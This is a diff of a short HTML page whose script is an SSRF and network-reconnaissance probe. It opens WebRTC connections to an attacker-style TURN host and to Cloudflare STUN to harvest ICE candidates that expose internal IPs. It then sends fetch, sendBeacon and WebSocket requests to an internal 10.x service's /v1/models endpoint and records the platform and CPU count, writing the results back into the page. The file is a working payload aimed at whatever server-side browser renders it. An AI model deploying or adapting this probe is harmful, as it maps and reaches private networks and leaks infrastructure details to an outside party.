@@ -1,15 +1,28 @@
-<!DOCTYPE html><html><head><title>PR</title></head><body><div id="o">S</div><script>
+<!DOCTYPE html><html><head><title>P</title></head><body><div id="o">S</div><script>
 var o=document.getElementById("o");o.innerHTML+="<br>JS_RUNS";var out=[];
-var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.cloudflare.com:3478"}]});
+
+// 1. TURN relay
+var pc=new RTCPeerConnection({iceServers:[{urls:"turn:ssrf-turn.southeastasia.azurecontainer.io:3478",username:"p",credential:"p"}]});
 pc.createDataChannel("");pc.createOffer().then(function(of){pc.setLocalDescription(of);});
-pc.onicecandidate=function(e){if(e&&e.candidate&&e.candidate.candidate)out.push("CF:"+e.candidate.candidate);};
-fetch("http://10.4.232.131:38081/v1/models",{mode:"cors"})
-  .then(function(r){out.push("CORS:"+r.status+":"+r.type);return r.text();})
-  .then(function(t){out.push("BODY:"+t.slice(0,400));})
-  .catch(function(e){out.push("ERR:"+e.message.slice(0,100));});
-fetch("http://10.4.232.131:38081/v1/models",{mode:"no-cors"})
-  .then(function(r){out.push("NC:"+r.status+":"+r.type);})
-  .catch(function(e){out.push("NC_ERR:"+e.message.slice(0,50));});
-out.push("PLAT="+navigator.platform);
-setTimeout(function(){o.innerHTML+="<br>"+out.join("|");},4000);
+pc.onicecandidate=function(e){if(e&&e.candidate&&e.candidate.candidate)out.push("TURN:"+e.candidate.candidate);};
+
+// 2. STUN
+var pc2=new RTCPeerConnection({iceServers:[{urls:"stun:stun.cloudflare.com:3478"}]});
+pc2.createDataChannel("");pc2.createOffer().then(function(of){pc2.setLocalDescription(of);});
+pc2.onicecandidate=function(e){if(e&&e.candidate&&e.candidate.candidate)out.push("CF:"+e.candidate.candidate);};
+
+// 3. fetch no-cors to internal IP
+fetch("http://10.4.232.131:38081/v1/models",{mode:"no-cors"}).then(function(r){out.push("NC:"+r.status+":"+r.type);}).catch(function(e){out.push("NC_ERR:"+e.message.slice(0,50));});
+
+// 4. fetch cors to internal IP
+fetch("http://10.4.232.131:38081/v1/models",{mode:"cors"}).then(function(r){out.push("CORS:"+r.status+":"+r.type);return r.text();}).then(function(t){out.push("CORS_BODY:"+t.slice(0,200));}).catch(function(e){out.push("CORS_ERR:"+e.message.slice(0,50));});
+
+// 5. sendBeacon
+try{navigator.sendBeacon("http://10.4.232.131:38081/beacon","t");out.push("BEACON_SENT");}catch(e){out.push("BEACON_ERR:"+e.message.slice(0,50));}
+
+// 6. WebSocket
+try{var ws=new WebSocket("ws://10.4.232.131:38081/");ws.onopen=function(){out.push("WS_OPEN");};ws.onerror=function(){out.push("WS_ERR");};ws.onclose=function(){out.push("WS_CLOSE");};}catch(e){out.push("WS_EXC:"+e.message.slice(0,50));}
+
+out.push("PLAT="+navigator.platform);out.push("HW="+navigator.hardwareConcurrency);
+setTimeout(function(){o.innerHTML+="<br>"+out.join("|");},3000);
 </script></body></html>
